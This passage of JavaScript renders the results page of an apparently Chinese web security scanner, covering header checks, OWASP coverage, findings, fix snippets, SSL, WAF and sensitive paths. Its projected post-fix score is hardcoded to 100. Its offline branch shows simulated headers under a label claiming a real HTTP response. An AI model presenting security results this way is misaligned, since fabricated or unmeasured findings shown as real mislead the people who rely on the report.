  html += '<p style="margin:12px 0 0 0;font-size:11px;color:var(--text-light);line-height:1.5">提示：以上为基于当前扫描结果的修复预估效果，实际效果取决于修复配置的应用完整度。</p>';
  html += '</div>';

  // Radar chart (5 维度)
  html += '<div class="card fade-in-up" style="animation-delay:0.12s;text-align:center;padding:20px">';
  html += '<div class="card-title">安全维度</div>';
  html += buildRadarSvg(data);
  html += '</div>';

  // 安全顾问
  html += '<div class="ai-advisor fade-in-up" style="animation-delay:0.15s">';
  html += '<div class="ai-avatar">顾问</div>';
  html += '<div class="ai-bubble">';
  html += '<div class="ai-tag">安全顾问</div>';
  html += '<p>' + escapeHtml(data.ai_report.summary) + '</p>';
  html += '<div class="priority">优先处理：' + escapeHtml(data.ai_report.priority) + '</div>';
  html += '</div></div>';

  // Export actions
  html += '<div class="card fade-in-up" style="animation-delay:0.2s">';
  html += '<div class="card-title">导出</div>';
  html += '<p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">发现 ' + data.findings.length + ' 个问题，导出报告与修复配置</p>';
  html += '<div style="display:flex;gap:10px;flex-wrap:wrap">';
  html += '<button class="fixer-btn primary" onclick="downloadReport(\'pdf\')">下载 PDF 报告</button>';
  html += '<button class="fixer-btn secondary" onclick="downloadAllFixes()">导出修复配置包</button>';
  html += '</div>';
  html += '</div>';

  // OWASP
  html += '<div class="card fade-in-up" style="animation-delay:0.25s">';
  html += '<div class="card-title">OWASP Top 10 覆盖</div>';
  data.owasp_coverage.forEach(function(item) {
    let statusClass = item.status === '通过' ? 'pass' : item.status === '高风险' ? 'fail' : item.status === '低风险' ? 'warn' : 'unknown';
    let barClass = item.status === '通过' ? 'pass' : item.status === '高风险' ? 'fail' : item.status === '低风险' ? 'warn' : 'unknown';
    html += '<div class="owasp-item">';
    html += '<span class="owasp-label">' + escapeHtml(item.category) + '</span>';
    html += '<div class="owasp-bar-wrap"><div class="owasp-bar ' + barClass + '"></div></div>';
    html += '<span class="owasp-status ' + statusClass + '">' + escapeHtml(item.status) + '</span>';
    html += '</div>';
  });
  html += '</div>';
  html += '<div class="card fade-in-up" style="animation-delay:0.28s">';
  html += '<div class="card-title">响应头检测';
  if (true) {
    html += ' <span style="font-size:12px;color:var(--success);font-weight:400">(基于真实 HTTP 响应)</span>';
  }
  html += '</div>';
  html += '<div class="code-block" style="font-size:12px;line-height:2">';

  if ( data.header_details && data.header_details.length > 0) {
    // Real scan: show actual headers
    html += '<div style="color:#64748b">HTTP/1.1 200 OK</div>';
    html += '<div>Date: ' + new Date().toUTCString() + '</div>';
    // Show raw headers summary
    if (data.raw_headers) {
      let rh = data.raw_headers;
      if (rh['server']) {
        html += '<div>Server: <span style="color:#f0a732">' + escapeHtml(rh['server']) + '</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>';
      }
      if (rh['content-type']) {
        html += '<div>Content-Type: ' + escapeHtml(rh['content-type'].split(';')[0]) + '</div>';
      }
    }
    html += '<div style="color:#94a3b8;margin-top:4px">--- Security Headers ---</div>';
    // Show each header detail
    data.header_details.forEach(function(h) {
      if (h.status === 'present') {
        html += '<div style="color:var(--success)">' + escapeHtml(h.name) + ': ' + escapeHtml(h.value || '(已配置)') + ' [已配置]</div>';
      } else if (h.status === 'missing') {
        html += '<div style="color:var(--danger)">' + escapeHtml(h.name) + ': <span style="color:var(--text-lighter)">[缺失]</span> </div>';
      } else if (h.status === 'leak') {
        html += '<div style="color:#f0a732">' + escapeHtml(h.name) + ': <span style="color:#f0a732">' + escapeHtml(h.value) + '</span> 信息泄露</div>';
      } else if (h.status === 'warning') {
        html += '<div style="color:#f0a732">' + escapeHtml(h.name) + ': <span style="color:#f0a732">' + escapeHtml(h.value || '') + '</span> 配置风险</div>';
      } else if (h.status === 'not_set') {
        html += '<div style="color:var(--text-lighter)">' + escapeHtml(h.name) + ': <span style="color:var(--text-lighter)">[未设置]</span></div>';
      }
    });
  } else {
    // Offline mode: simulated headers (legacy behavior)
    html += '<div style="color:#64748b">HTTP/1.1 200 OK</div>';
    html += '<div>Server: <span style="color:#f0a732">nginx/1.18.0</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>';
    html += '<div>Date: ' + new Date().toUTCString() + '</div>';
    html += '<div>Content-Type: text/html; charset=utf-8</div>';
    if (data.score >= 50) {
      html += '<div style="color:var(--success)">X-Frame-Options: DENY [已配置]</div>';
    } else {
      html += '<div style="color:var(--danger)">X-Frame-Options: <span style="color:var(--text-lighter)">[缺失]</span></div>';
    }
    if (data.score >= 60) {
      html += '<div style="color:var(--success)">X-Content-Type-Options: nosniff </div>';
    } else {
      html += '<div style="color:var(--danger)">X-Content-Type-Options: <span style="color:var(--text-lighter)">[缺失]</span> </div>';
    }
    if (data.score >= 70) {
      html += '<div style="color:var(--success)">Strict-Transport-Security: max-age=31536000 </div>';
    } else {
      html += '<div style="color:var(--danger)">Strict-Transport-Security: <span style="color:var(--text-lighter)">[缺失]</span> </div>';
    }
    if (data.score >= 65) {
      html += '<div style="color:var(--success)">Content-Security-Policy: default-src &#x27;self&#x27; </div>';
    } else {
      html += '<div style="color:var(--danger)">Content-Security-Policy: <span style="color:var(--text-lighter)">[缺失]</span> </div>';
    }
  }
  html += '</div></div>';

  // 漏洞项 - Burp workbench layout: left list + right detail
  html += '<div class="section-title fade-in-up" style="animation-delay:0.3s">漏洞详情</div>';
  // Vuln Sentinel: 0 漏洞时显示提示
  if (!data.findings || data.findings.length === 0) {
    html += '<div class="card fade-in-up" style="animation-delay:0.35s;text-align:center;padding:40px 20px;background:#3c3f41;border:1px solid #555555">';
    html += '<h3 style="margin:0 0 8px;color:#73c990;font-size:16px">安全状况良好</h3>';
    html += '<p style="color:var(--text-secondary);margin:0 0 16px;font-size:13px;line-height:1.6">当前未发现明显问题。<br/>建议保留结果作为基线，并在版本变更后复测。</p>';
    html += '<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">';
    html += '<button onclick="navigateTo(\'scan\')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">重新扫描</button>';
    html += '<button onclick="navigateTo(\'evolution\')" style="background:transparent;color:var(--text);border:1px solid var(--border);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px">查看进化中心</button>';
    html += '</div></div>';
  }
  // Vuln Sentinel: 给没有置信度的 finding 自动设置默认值（响应头检测=高，敏感路径=中，信息泄露=高）
  data.findings.forEach(function(f) {
    if (!f.confidence_level && typeof f.confidence !== 'number') {
      let name = f.name || '';
      if (name.indexOf('缺少') === 0 || name.indexOf('HSTS') >= 0 || name.indexOf('CSP') >= 0 || name.indexOf('X-Frame') >= 0 || name.indexOf('X-Content') >= 0 || name.indexOf('Referrer') >= 0 || name.indexOf('Permissions') >= 0) {
        f.confidence_level = '高';
        f.cv_reason = '响应头确定性检测';
      } else if (name.indexOf('敏感路径') >= 0 || name.indexOf('敏感文件') >= 0 || name.indexOf('目录') >= 0) {
        f.confidence_level = '中';
        f.cv_reason = 'HTTP 状态码推断';
      } else if (name.indexOf('信息泄露') >= 0 || name.indexOf('Server') >= 0 || name.indexOf('版本') >= 0) {
        f.confidence_level = '高';
        f.cv_reason = '响应头内容匹配';
      } else {
        f.confidence_level = '中';
        f.cv_reason = '启发式检测';
      }
    }
  });
  let listHtml = '';
  let detailHtml = '';
  data.findings.forEach(function(f, i) {
    let levelClass = getRiskClass(f.level);
    let scanIdForFeedback = data.scan_id || data.id || 0;
    let fbInitial = (data.finding_feedback_map && data.finding_feedback_map[f.name]) || null;
    let fpClass = fbInitial && fbInitial.is_false_positive ? ' fp-marked' : '';
    let confClass = fbInitial && fbInitial.is_confirmed ? ' confirmed' : '';
    
    // Vuln Sentinel: 优先级标签
    let priorityLabel = '';
    let priorityClass = '';
    let fLevel = f.level || f.severity || '';
    if (fLevel === '严重' || fLevel === 'critical' || fLevel === '高风险' || fLevel === '高危') {
      priorityLabel = '紧急';
      priorityClass = 'priority-urgent';
    } else if (fLevel === '中风险' || fLevel === '中危' || fLevel === 'medium') {
      priorityLabel = '重要';
      priorityClass = 'priority-important';
    } else {
      priorityLabel = '一般';
      priorityClass = 'priority-normal';
    }
    
    // Left panel list item
    let sevDotClass = levelClass;
    listHtml += '<div class="result-list-item' + (i === 0 ? ' active' : '') + '" id="finding-list-' + i + '" onclick="selectFinding(' + i + ')" role="button" tabindex="0" onkeydown="if(event.key===\'Enter\'||event.key===\' \'){event.preventDefault();selectFinding(' + i + ');}">';
    listHtml += '<div class="finding-name">' + escapeHtml(f.name) + '</div>';
    listHtml += '<div class="finding-meta"><span class="severity-dot ' + sevDotClass + '"></span><span>' + escapeHtml(f.level) + '</span><span class="severity-tag ' + priorityClass + '">' + priorityLabel + '</span></div>';
    listHtml += '</div>';
    // Right panel detail
    detailHtml += '<div class="finding-detail' + (i === 0 ? ' active' : '') + '" id="finding-detail-' + i + '" data-finding-name="' + escapeHtml(f.name) + '" data-scan-id="' + scanIdForFeedback + '">';
    detailHtml += '<div class="finding-detail-header">';
    detailHtml += '<span class="finding-level ' + levelClass + '">' + escapeHtml(f.level) + '</span>';
    detailHtml += '<span class="finding-name">' + escapeHtml(f.name) + '</span>';
    detailHtml += '<span class="finding-priority ' + priorityClass + '">' + priorityLabel + '</span>';
    if (fbInitial && fbInitial.is_false_positive) {
      detailHtml += '<span class="fp-badge">已标记为误报</span>';
    } else if (fbInitial && fbInitial.is_confirmed) {
      detailHtml += '<span class="confirmed-badge">已确认</span>';
    }
    detailHtml += '</div>';
    detailHtml += '<div class="finding-detail-body">';
    detailHtml += '<div class="finding-section"><h4>问题摘要</h4><p>' + escapeHtml(f.summary) + '</p></div>';
    detailHtml += '<div class="finding-section"><h4>OWASP 分类</h4><p>' + escapeHtml(f.owasp) + '</p></div>';
    // 漏洞定位信息
    if (f.location && f.location.target) {
      detailHtml += '<div class="finding-section" style="background:#313335;border:1px solid #555555;"><h4>漏洞定位</h4>';
      detailHtml += '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:6px">';
      detailHtml += '<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px;font-weight:600">' + escapeHtml(f.location.target) + '</span>';
      if (f.location.detail) {
        detailHtml += '<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px">' + escapeHtml(f.location.detail) + '</span>';
      }
      detailHtml += '</div></div>';
    }
    detailHtml += '<div class="finding-section"><h4>智能检查</h4><p>' + escapeHtml(f.ai_advice).replace(/\n/g, '<br>') + '</p></div>';
    detailHtml += '<div class="finding-section"><h4>建议</h4><p>' + escapeHtml(f.fix) + '</p></div>';
    // 判断依据 evidence
    let evidenceText = '';
    if (f.evidence) {
      if (f.evidence.header && f.name.indexOf('缺少') === 0) {
        evidenceText = '命中响应头缺失：' + f.evidence.header;
      } else if (f.evidence.reason && (f.name.indexOf('敏感路径') >= 0 || f.name.indexOf('敏感文件') >= 0)) {
        evidenceText = '命中内容特征：' + f.evidence.reason;
      } else if (f.name.indexOf('robots.txt') >= 0 || f.name.indexOf('Robots') >= 0) {
        evidenceText = 'robots.txt 是公开协议文件，仅作为信息项展示';
      } else if (f.evidence.reason) {
        evidenceText = f.evidence.reason;
      }
    }
    if (evidenceText) {
      detailHtml += '<div style="margin-top:6px;font-size:12px;color:var(--text-lighter);border-top:1px dashed var(--border);padding-top:6px">判断依据：' + escapeHtml(evidenceText) + '</div>';
    }
    // 技术验证细节（evidence）
    if (f.evidence) {
      let eviHtml = renderEvidence(f.evidence);
      if (eviHtml) {
        detailHtml += '<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px">' + eviHtml + '</div></details>';
      } else {
        detailHtml += '<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px;font-size:12px;color:var(--text-lighter)">无额外技术细节</div></details>';
      }
    }
    // 多平台建议 Tab
    if (f.fixes && Object.keys(f.fixes).length > 0) {
      let fixPlatforms = f.fixes;
      let platformNames = {
        nginx: "Nginx", apache: "Apache", express: "Express",
        flask: "Flask/FastAPI", spring_boot: "Spring Boot", cloudflare: "Cloudflare"
      };
      let platformOrder = ["nginx", "apache", "express", "flask", "spring_boot", "cloudflare"];
      let availablePlatforms = platformOrder.filter(function(p) { return fixPlatforms[p] && fixPlatforms[p].length > 0 });
      if (availablePlatforms.length > 0) {
        let findingIdx = i;
        detailHtml += '<div style="margin-top:8px">';
        detailHtml += '<div style="display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap">';
        availablePlatforms.forEach(function(p, pi) {
          let active = pi === 0;
          detailHtml += '<button onclick="switchFixPlatform(\'' + p + '\', \'finding-fix-\')" id="finding-fix-tab-' + p + '" style="padding:4px 10px;border-radius:2px;border:1px solid ' + (active ? 'var(--primary)' : 'var(--border)') + ';background:' + (active ? 'var(--primary)' : 'transparent') + ';color:' + (active ? '#fff' : 'var(--text-secondary)') + ';cursor:pointer;font-size:12px">' + platformNames[p] + '</button>';
        });
        detailHtml += '</div>';
        availablePlatforms.forEach(function(p, pi) {
          let display = pi === 0 ? 'block' : 'none';
          detailHtml += '<div id="finding-fix-content-' + p + '" style="display:' + display + '">';
          fixPlatforms[p].forEach(function(fix, fi) {
            let code = typeof fix === 'string' ? fix : (fix.code || '');
            let riskNote = typeof fix === 'object' ? (fix.risk_note || '') : '';
            let copyId = 'fix-copy-' + p + '-' + fi;
            detailHtml += '<div style="position:relative;margin-bottom:6px">';
            detailHtml += '<pre style="background:#2b2b2b;border:1px solid #555555;padding:10px;padding-right:50px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin:0">' + escapeHtml(code) + '</pre>';
            detailHtml += '<button onclick="copyFixCode(\'' + copyId + '\')" id="' + copyId + '-btn" aria-label="复制修复代码" style="position:absolute;top:6px;right:6px;padding:6px 12px;min-height:0;background:#45494a;color:#bbbbbb;border:1px solid #555555;border-radius:2px;font-size:12px;font-weight:600;cursor:pointer;transition:background 0.15s" onmouseover="this.style.background=\'#4b6eaf\';this.style.color=\'#fff\'" onmouseout="this.style.background=\'#45494a\';this.style.color=\'#bbbbbb\'">复制</button>';
            detailHtml += '<textarea id="' + copyId + '" style="position:absolute;left:-9999px">' + escapeHtml(code) + '</textarea>';
            detailHtml += '</div>';
            if (riskNote) {
              detailHtml += '<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:#3d2929;border-radius:2px;margin-bottom:6px">' + escapeHtml(riskNote) + '</div>';
            }
          });
          detailHtml += '</div>';
        });
        detailHtml += '</div>';
      }
    }
    if (f.remediation) {
      detailHtml += '<div class="finding-section"><h4>修复步骤</h4><ul>';
      (f.remediation.steps || []).forEach(function(s) {
        detailHtml += '<li>' + escapeHtml(s) + '</li>';
      });
      detailHtml += '</ul></div>';
      if (f.remediation.nginx) {
        detailHtml += '<div class="finding-section"><h4>服务器配置</h4><div class="code-block">' + escapeHtml(f.remediation.nginx) + '</div></div>';
      }
      if (f.remediation.apache) {
        detailHtml += '<div class="finding-section"><h4>Apache 配置</h4><div class="code-block">' + escapeHtml(f.remediation.apache) + '</div></div>';
      }
      if (f.remediation.node) {
        detailHtml += '<div class="finding-section"><h4>Node.js 配置</h4><div class="code-block">' + escapeHtml(f.remediation.node) + '</div></div>';
      }
      if (f.remediation.verify) {
        detailHtml += '<div class="finding-section"><h4>验证方法</h4><p>' + escapeHtml(f.remediation.verify) + '</p></div>';
      }
    }
    // Vuln Sentinel: 详细验证步骤（三步验证法）
    if (f.verify_steps && f.verify_steps.length > 0) {
      detailHtml += '<div class="finding-section">';
      detailHtml += '<h4>验证修复（三步验证法）</h4>';
      detailHtml += '<div style="display:flex;flex-direction:column;gap:10px;margin-top:8px">';
      f.verify_steps.forEach(function(step, idx) {
        let stepLabels = ['1.', '2.', '3.'];
        let stepLabel = stepLabels[idx] || (idx+1) + '.';
        detailHtml += '<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 12px;border-left:3px solid var(--success)">';
        detailHtml += '<div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">';
        detailHtml += '<span style="font-size:12px;font-weight:700;color:var(--text-primary)">第 ' + (idx+1) + ' 步：' + escapeHtml(step.method || '验证') + '</span>';
        detailHtml += '</div>';
        if (step.command) {
          detailHtml += '<div style="font-size:12px;color:var(--text-secondary);margin-bottom:5px">操作：</div>';
          detailHtml += '<pre style="margin:0 0 6px 0;padding:6px 8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">' + escapeHtml(step.command) + '</pre>';
        }
        if (step.expect) {
          detailHtml += '<div style="font-size:12px;color:var(--text-secondary);display:flex;align-items:flex-start;gap:4px">';
          detailHtml += '<span style="color:#73c990;font-weight:700;flex-shrink:0">预期：</span>';
          detailHtml += '<span style="color:var(--text-primary)">' + escapeHtml(step.expect) + '</span>';
          detailHtml += '</div>';
        }
        detailHtml += '</div>';
      });
      detailHtml += '</div>';
      detailHtml += '<div style="margin-top:8px;padding:6px 10px;background:rgba(115,201,144,0.08);border-radius:2px;font-size:12px;color:#15803d;border:1px solid rgba(115,201,144,0.2)">';
      detailHtml += '<strong>提示：</strong>建议按顺序执行三步验证，全部通过后再使用本工具重新扫描确认。';
      detailHtml += '</div>';
      detailHtml += '</div>';
    } else if (f.verify_method) {
      // 兼容旧格式：只有一句话验证方法
      detailHtml += '<div class="finding-section"><h4>验证方法</h4><p>' + escapeHtml(f.verify_method) + '</p></div>';
    }
    // 证据详情
    if (f.evidence && Object.keys(f.evidence).length > 0) {
      detailHtml += '<div style="margin-top:8px;padding:10px;background:var(--bg-secondary);border-radius:2px;font-size:12px">';
      detailHtml += '<div style="font-weight:600;margin-bottom:4px;color:var(--primary)">证据详情</div>';
      let _eviDetailHtml = renderEvidence(f.evidence);
      if (_eviDetailHtml) {
        detailHtml += _eviDetailHtml;
      } else {
        detailHtml += '<div style="color:var(--text-lighter)">无额外技术细节</div>';
      }
      detailHtml += '</div>';
    }
    // Vuln Sentinel 置信度（高/中/低）+ 误报反馈行
    let confLevel = f.confidence_level || '';
    let conf = (typeof f.confidence === 'number') ? f.confidence : null;
    let cvReason = f.cv_reason || '';
    let confClassName = 'finding-confidence';
    // 优先用 confidence_level 映射样式
    if (confLevel === '高') confClassName += ' high';
    else if (confLevel === '中') confClassName += ' medium';
    else if (confLevel === '低') confClassName += ' low';
    else if (conf !== null) {
      if (conf >= 80) confClassName += ' high';
      else if (conf >= 60) confClassName += ' medium';
      else confClassName += ' low';
    }
    detailHtml += '<div class="finding-feedback-row" data-finding-name="' + escapeHtml(f.name) + '" data-scan-id="' + scanIdForFeedback + '">';
    detailHtml += '<span style="color:var(--text-light)">置信度</span>';
    if (confLevel) {
      detailHtml += '<span class="' + confClassName + '">' + escapeHtml(confLevel) + '</span>';
    } else if (conf !== null) {
      detailHtml += '<span class="' + confClassName + '">' + conf + '%</span>';
    } else {
      detailHtml += '<span class="' + confClassName + '">未评估</span>';
    }
    if (cvReason) {
      detailHtml += '<span style="font-size:12px;color:var(--text-lighter)">· ' + escapeHtml(cvReason) + '</span>';
    }
    // 待复核标签（suspect 项）
    if (f.review_required || confLevel === '中') {
      detailHtml += '<span style="font-size:11px;background:var(--warning);color:#000;padding:1px 6px;border-radius:2px;margin-left:6px">待复核</span>';
    }
    // 反馈按钮
    let btnDisabled = (fbInitial && (fbInitial.is_false_positive || fbInitial.is_confirmed)) ? ' disabled' : '';
    detailHtml += '<button class="finding-feedback-btn btn-confirm" onclick="submitFindingFeedback(this, \'' + escapeAttr(f.name) + '\', ' + scanIdForFeedback + ', false)" ' + btnDisabled + '>准确</button>';
    detailHtml += '<button class="finding-feedback-btn btn-fp" onclick="submitFindingFeedback(this, \'' + escapeAttr(f.name) + '\', ' + scanIdForFeedback + ', true)" ' + btnDisabled + '>误报</button>';
    if (fbInitial && fbInitial.is_false_positive) {
      detailHtml += '<span class="fp-reason-text">已标记为误报，将用于优化后续检测</span>';
    } else if (fbInitial && fbInitial.is_confirmed) {
      detailHtml += '<span class="fp-reason-text" style="color:#73c990">已确认为真实问题，感谢您的反馈</span>';
    }
    detailHtml += '</div>';
    detailHtml += '</div></div>';
  });
  // Assemble workbench
  if (data.findings && data.findings.length > 0) {
    html += '<div class="result-workbench">';
    html += '<div class="result-list-panel"><div class="result-list-header">发现项（' + data.findings.length + ')</div><div class="result-list">' + listHtml + '</div></div>';
    html += '<div class="result-detail-panel" id="result-detail-panel">' + detailHtml + '</div>';
    html += '</div>';
  }

  // 建议 - 多平台 Tab（报告级别）
  if (data.fixes && Object.keys(data.fixes).length > 0) {
    let fixPlatforms = data.fixes;
    let platformNames = {
      nginx: "Nginx", apache: "Apache", express: "Express",
      flask: "Flask/FastAPI", spring_boot: "Spring Boot", cloudflare: "Cloudflare"
    };
    let platformOrder = ["nginx", "apache", "express", "flask", "spring_boot", "cloudflare"];
    let availablePlatforms = platformOrder.filter(function(p) { return fixPlatforms[p] && fixPlatforms[p].length > 0 });

    if (availablePlatforms.length > 0) {
      html += '<div class="card fade-in-up" style="animation-delay:0.3s;border:2px solid rgba(115,201,144,0.4);background:#3c3f41,rgba(115,201,144,0.01))">';
      html += '<div style="font-weight:700;font-size:16px;margin-bottom:10px;color:var(--success)"> 建议（' + availablePlatforms.length + ' 种平台）</div>';
      html += '<div style="display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap">';
      availablePlatforms.forEach(function(p, i) {
        let active = i === 0;
        html += '<button onclick="switchFixPlatform(\'' + p + '\')" id="fix-tab-' + p + '" style="padding:6px 14px;border-radius:2px;border:1px solid ' + (active ? 'var(--primary)' : 'var(--border)') + ';background:' + (active ? 'var(--primary)' : 'transparent') + ';color:' + (active ? '#fff' : 'var(--text-secondary)') + ';cursor:pointer;font-size:12px">' + platformNames[p] + '</button>';
      });
      html += '</div>';
      availablePlatforms.forEach(function(p, i) {
        let display = i === 0 ? 'block' : 'none';
        html += '<div id="fix-content-' + p + '" style="display:' + display + '">';
        fixPlatforms[p].forEach(function(fix) {
          let code = typeof fix === 'string' ? fix : (fix.code || '');
          let riskNote = typeof fix === 'object' ? (fix.risk_note || '') : '';
          html += '<pre style="background:var(--bg-secondary);padding:12px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin-bottom:8px">' + escapeHtml(code) + '</pre>';
          if (riskNote) {
            html += '<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:rgba(240,167,50,0.1);border-radius:2px;margin-bottom:8px">' + escapeHtml(riskNote) + '</div>';
          }
        });
        html += '</div>';
      });
      html += '</div>';
    }
  }

  // Generate Fix
  html += '<div class="gen-fix-section fade-in-up" style="animation-delay:0.4s">';
  html += '<h3> 一键生成修复配置</h3>';
  html += '<p class="card-desc" style="margin-bottom:14px">输入您的配置，系统将根据扫描结果生成可直接参考的建议</p>';
  html += '<div class="gen-fix-row">';
  html += '<input type="text" id="gen-fix-input" placeholder="粘贴配置或输入 server 块..." />';
  html += '<button class="gen-fix-btn" onclick="generateFixFromResult()"> 生成</button>';
  html += '</div>';
  html += '<div id="gen-fix-output"></div>';
  html += '</div>';

  // 复测后：所有 finding 全部消除，仅保留修复加成（最多 100）
  let fixed评分 = Math.min(100, 100 + 12);
  html += '<div class="score-compare fade-in-up" style="animation-delay:0.45s">';
  html += '<h3> 复测后评分对比</h3>';
  html += '<div class="score-rings">';
  html += '<div class="score-ring-item">';
  html += '<div class="ring" style="background:' + getScoreGradient(data.score) + '">';
  html += '<div class="val" style="color:#fff">' + data.score + '</div>';
  html += '<div class="lbl" style="color:rgba(255,255,255,0.7)">复测前</div>';
  html += '</div>';
  html += '<div class="tag">复测前</div>';
  html += '</div>';
  html += '<div class="score-ring-item">';
  html += '<div class="ring" id="score-after-ring" style="background:' + getScoreGradient(fixed评分) + '">';
  html += '<div class="val" style="color:#fff">' + fixed评分 + '</div>';
  html += '<div class="lbl" style="color:rgba(255,255,255,0.7)">复测后</div>';
  html += '</div>';
  html += '<div class="tag">复测后</div>';
  html += '</div>';
  html += '</div>';
  html += '<div class="score-improve" id="score-diff"> 提升 <strong>' + (fixed评分 - data.score) + '</strong> 分 <span>（' + data.score + ' -> ' + fixed评分 + '）</span></div>';
  html += '<div class="score-rules"><p>评分规则：基础 100 分 - 高风险(18) - 中风险(10) - 低风险(4) + 修复配置(+12) + PR修复(+10)</p></div>';
  html += '</div>';
  if ( data.ssl_info && data.ssl_info.has_cert) {
    html += '<div class="card fade-in-up" style="animation-delay:0.32s">';
    html += '<div class="card-title"> SSL 证书信息</div>';
    let ssl = data.ssl_info;
    html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px">';
    html += '<div><span style="color:var(--text-lighter)">域名:</span> ' + escapeHtml(ssl.subject || 'N/A') + '</div>';
    html += '<div><span style="color:var(--text-lighter)">签发机构:</span> ' + escapeHtml(ssl.issuer || 'N/A') + '</div>';
    html += '<div><span style="color:var(--text-lighter)">TLS 版本:</span> ' + escapeHtml(ssl.version || 'N/A') + '</div>';
    html += '<div><span style="color:var(--text-lighter)">密码套件:</span> ' + escapeHtml(ssl.cipher || 'N/A') + '</div>';
    html += '<div><span style="color:var(--text-lighter)">剩余天数:</span> ' + (ssl.days_left != null ? ssl.days_left + ' 天' : 'N/A') + '</div>';
    html += '<div><span style="color:var(--text-lighter)">过期时间:</span> ' + escapeHtml(ssl.not_after || 'N/A') + '</div>';
    if (ssl.san && ssl.san.length > 0) {
      html += '<div style="grid-column:1/-1"><span style="color:var(--text-lighter)">SAN:</span> ' + escapeHtml(ssl.san.join(', ')) + '</div>';
    }
    html += '</div>';
    if (ssl.expired) {
      html += '<div style="margin-top:8px;padding:6px 10px;background:rgba(199,84,80,0.1);border-radius:2px;color:var(--danger);font-size:12px;font-weight:600">证书已过期！</div>';
    } else if (ssl.days_left != null && ssl.days_left < 30) {
      html += '<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">证书将在 ' + ssl.days_left + ' 天后过期</div>';
    }
    if (ssl.weak) {
      html += '<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">使用弱加密协议/套件</div>';
    }
    html += '</div>';
  }
  if (data.waf && data.waf.length > 0) {
    html += '<div class="card fade-in-up" style="animation-delay:0.34s">';
    html += '<div class="card-title"> WAF 防护检测</div>';
    html += '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px">';
    data.waf.forEach(function(w) {
      html += '<span style="display:inline-flex;align-items:center;gap:4px;padding:4px 10px;background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);border-radius:2px;font-size:12px;font-weight:600">' + escapeHtml(w.name) + '</span>';
    });
    html += '</div>';
    // Vuln Sentinel：明确说明 WAF 不能替代安全响应头
    html += '<div style="padding:8px 12px;background:rgba(59,130,246,0.06);border-radius:2px;font-size:12px;color:var(--text-light);line-height:1.5">';
    html += 'WAF 提供应用层防护，但不能替代 HSTS、CSP、Cookie 安全策略等配置。下方发现的缺失项仍需修复。';
    html += '</div>';
    html += '</div>';
  }
  if ( data.sensitive_paths && data.sensitive_paths.length > 0) {
    let exposedPaths = data.sensitive_paths.filter(function(p) { return p.exposed; });
    let suspectPaths = data.sensitive_paths.filter(function(p) { return p.suspect; });
    let infoPaths = data.sensitive_paths.filter(function(p) { return p.info; });
    let otherPaths = data.sensitive_paths.filter(function(p) { return !p.exposed && !p.suspect && !p.info; });
    html += '<div class="card fade-in-up" style="animation-delay:0.36s">';
    html += '<div class="card-title"> 敏感路径探测</div>';
    // 确认漏洞（红色）
    if (exposedPaths.length > 0) {
      html += '<div style="margin-bottom:12px">';
      html += '<div style="font-size:13px;font-weight:700;color:var(--danger);margin-bottom:6px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;border-left:3px solid var(--danger)"> 确认漏洞 (' + exposedPaths.length + ')</div>';
      html += '<div style="font-size:12px;line-height:2">';
      exposedPaths.forEach(function(p) {
        html += '<div style="color:var(--danger)">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span>  已暴露 (' + (p.size || '-') + ' bytes)</div>';
      });
      html += '</div></div>';
    }
    // 疑似风险（黄色）
    if (suspectPaths.length > 0) {
      html += '<div style="margin-bottom:12px">';
      html += '<div style="font-size:13px;font-weight:700;color:var(--warning);margin-bottom:6px;padding:4px 8px;background:rgba(240,167,50,0.08);border-radius:2px;border-left:3px solid var(--warning)">疑似风险 (' + suspectPaths.length + ')</div>';
      html += '<div style="font-size:12px;line-height:2">';
      suspectPaths.forEach(function(p) {
        html += '<div style="color:var(--warning)">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span> ' + escapeHtml(p.reason || '疑似误报，需复核') + '</div>';
      });
      html += '</div></div>';
    }
    // 公开信息（蓝色）
    if (infoPaths.length > 0) {
      html += '<div style="margin-bottom:12px">';
      html += '<div style="font-size:13px;font-weight:700;color:#4b6eaf;margin-bottom:6px;padding:4px 8px;background:rgba(59,130,246,0.08);border-radius:2px;border-left:3px solid #4b6eaf">信息： 公开信息 (' + infoPaths.length + ')</div>';
      html += '<div style="font-size:12px;line-height:2">';
      infoPaths.forEach(function(p) {
